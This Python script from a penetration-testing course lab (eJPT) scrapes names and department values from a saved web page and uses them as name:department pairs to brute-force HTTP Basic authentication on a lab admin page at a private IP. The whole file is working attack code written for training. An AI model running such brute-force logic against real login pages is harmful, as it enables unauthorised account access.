# Xiao Kuang
# 5/31/2020
# www.elearnsecurity.com
# Pentest Student Course, eJPT Certification
# Python Lab: Use beautiful soup to scrape web page for potential usernames and passwords, then brute force the login page with the scraped user:password combos by sending http requests

from bs4 import BeautifulSoup
import requests
import base64

# the url of the web page we are making requests to
def brute_force(names, departments):
    url = "http://172.16.120.120/admin.php"
    for name in names:
        for department in departments:
            user_pass = (name + ":" + department)
            # print("Trying", user_pass)
            enc_user_pass = base64.b64encode((user_pass).encode('utf-8')).decode('utf-8')
            header = {'Authorization': ('Basic ' + enc_user_pass)}
            r = requests.get(url, headers=header)
            if r.status_code != 401:
                print("Credentials found!", user_pass)
                return
    print("Credentials not found :(")

def main():
    # source code of web page is saved as .html file
    soup = BeautifulSoup(open("pageSource.html"),features="html.parser")

    # build name and department list used for brute force
    names = []
    departments = []

    # use bs4 to get list of the tags identifying names and departments
    td_names = soup.find_all(id="name")
    td_departments = soup.find_all(id="department")

    # get the inner text the tags wrap around:  <td> text </td>
    for item in td_names:
        names.append(str(item.get_text()))
    for item in td_departments:
        departments.append(str(item.get_text()))

    # remove duplicate departments by creating a set
    departments = set(departments)

    # call brute force function to perform request with the list of names and departments
    brute_force(names, departments)

if __name__ == "__main__":
    main()